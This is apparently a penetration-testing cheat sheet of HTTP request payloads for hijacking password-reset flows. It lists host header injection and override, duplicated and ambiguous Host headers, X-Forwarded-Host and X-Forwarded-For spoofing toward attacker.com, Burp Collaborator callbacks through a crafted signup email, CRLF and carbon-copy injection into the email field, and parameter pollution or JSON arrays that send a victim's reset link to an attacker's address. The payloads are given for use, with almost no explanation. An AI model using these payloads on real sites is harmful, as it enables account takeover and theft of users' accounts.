##### HOST HEADER INJECTION
````
POST /reset
HOST: attacker.com
````

##### OVERRIDE HOST HEADER
````
POST https://target.com/reset
HOST: attacker.com
````

##### AMBIGUATE HOST HEADER
````
POST /reset
HOST: target.com@attacker.com


HOST: target.com:@attacker.com
HOST: target.com: attacker.com
````
##### other techniques
````
POST @attacker.com/reset
HOST: target.com


POST /reset@attacker.com#
HOST: target.com
````
##### DOUBLE HOST
````
POST /reset
HOST: target.com
HOST: attacker.com


add space in the host
POST /reset
HOST: target.com
 HOST: attacker.com

````
##### X-FORWARDED-FOR
````
POST /reset
HOST: attacker.com
X-FORWARDED-HOST: attacker.com



POST /reset
HOST: attacker.com
X-FORWARDED-HOST: target.com


POST /reset
HOST: target.com
X-FORWARDED-HOST: attacker.com
Referer: https://attacker.com


POST /reset
HOST: target.com
X-FORWARDED-HOST: attacker.com
X-FORWARDED-FOR: attacker.com



POST /reset
HOST: target.com
X-FORWARDED-HOST: 0177.1
X-FORWARDED-FOR: 0177.1
````
##### PARAMETER FUZZING USING BURP PARAMINER
 ````
 POST /reset
HOST: target.com

FUZZ 
 ````
 
 ##### SIGNING UP WITH TAMPERED EMAIL
 signup with email samsec@gmail.com.id.burpcollaborator.net and reset password for this email.
  we will recieve requests from internal server + SMTP connection details. and also we may get Internal headers + origin IP
   ````
   http://site.com/admin = (403)
   http://site.com/admin = (Headers + Origin IP = pwn)
   ````
 ````
 POST /reset
 
 email=test@123.burpcollaborator.net
 ````
 ##### EMAIL TAMPERING TO RECEIVE PASS RESET LINK IN ATTACKER EMAIL
 CRLF AND CARBON COPY INJECTION
 ````
 POST /reset
 HOST: target.com
 
 email=victim@gmail.com%0a%0dcc:attacker.com
 ````
 
 
 another methods
 - PARAMETER POLLUTION
```` email=victim@gmail.com&email=attacker@gmai.com````
 - SENDING TWO EMAIL AS ARRAY IN JSON AND ALSO CHANGING CONTENT-TYPE TO application/json
    ```` 
    POST /reset
    HOST: target.com
    Content-Type: application/json
    
    
    {"email":["victim@gmail.com","attacker@gmail.com"]}

    ````
 - using separator , | OR  %20
  ```` email=victim@gmail.com,attacker@gmail.com ````
  
  
